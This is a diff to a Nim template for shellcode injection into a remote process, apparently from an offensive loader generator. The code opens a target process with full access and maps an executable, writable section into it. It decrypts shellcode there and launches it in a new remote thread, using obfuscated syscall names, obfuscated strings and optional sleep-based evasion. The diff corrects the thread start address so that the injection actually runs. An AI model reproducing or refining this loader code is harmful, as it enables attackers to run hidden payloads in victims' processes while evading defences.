@@ -42,7 +42,7 @@ let ShellcodeRemoteInjectMapSection * = """
         status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
 
         when defined(verbose):
-            echo obf("[*] opqiwepoausdasdjl: "), status
+            echo obf("[*] NtOpenProcess: "), status
 
         var hMapFile: HANDLE = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, DWORD(sc_size), NULL)
 
@@ -73,7 +73,7 @@ let ShellcodeRemoteInjectMapSection * = """
         status = oqiazasusjk(pHandle2,lpMapAddress,unsafeAddr friendlycode,sc_size,addr bytesWritten)
 
         when defined(verbose):
-            echo obf("[*] oqiazasusjk: "), status
+            echo obf("[*] NtWriteVirtualMemory: "), status
             echo obf("    \\-- bytes written: "), bytesWritten
             echo obf("")
         var lpMapAddressRemote = MapViewOfFile3(hMapFile, pHandle, nil, 0, 0, 0, PAGE_EXECUTE_READWRITE, nil, 0)
@@ -86,7 +86,7 @@ let ShellcodeRemoteInjectMapSection * = """
         ptrDecText = cast[ptr byte](lpMapAddress)
         decryptlate()
         
-        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)
+        status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)
 
         status = zuatzuastdiasyy(tHandle)
         status = zuatzuastdiasyy(pHandle)
@@ -153,7 +153,7 @@ let ShellcodeRemoteInjectMapSection * = """
             echo obf("[-] Failed to map view of file remote")
             echo GetLastError()
         when defined(sleepinbetween):
-            HowMuchTimeWouldYouLikeToSleep(15)    
+            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)    
         ptrEncText = cast[ptr byte](lpMapAddress)
         ptrDecText = cast[ptr byte](lpMapAddress)
         decryptlate()
